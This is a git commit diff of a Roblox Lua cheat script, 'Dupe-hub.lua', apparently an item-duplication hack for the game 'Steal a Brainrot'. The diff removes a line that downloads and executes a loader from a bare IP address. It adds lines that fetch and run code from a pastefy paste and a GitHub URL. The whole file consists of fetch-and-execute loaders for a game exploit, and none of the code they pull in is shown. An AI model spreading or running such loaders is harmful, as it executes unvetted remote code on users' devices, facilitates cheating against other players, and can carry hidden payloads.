41729938823651e78706184ad19a883ab82d1b3c
Silentx <silentxvn@gmail.com>
2025-11-06 12:18:02 +0700

    Update Dupe-hub.lua

--- Dupe-hub.lua
+++ Dupe-hub.lua
@@ -1,4 +1,2 @@
-ID="9cf507ca-e866-4299-9303-1bb7cee4af2e";
-RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/silentxvn/StealABrainrotDupe/main/Dupe-hub.lua"));
-
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet('https://pastefy.app/AILhrbIZ/raw'))()
+local a = loadstring(game:HttpGet("https://raw.githubusercontent.com/silentxvn/StealABrainrotDupe/main/Dupe-hub.lua"))()
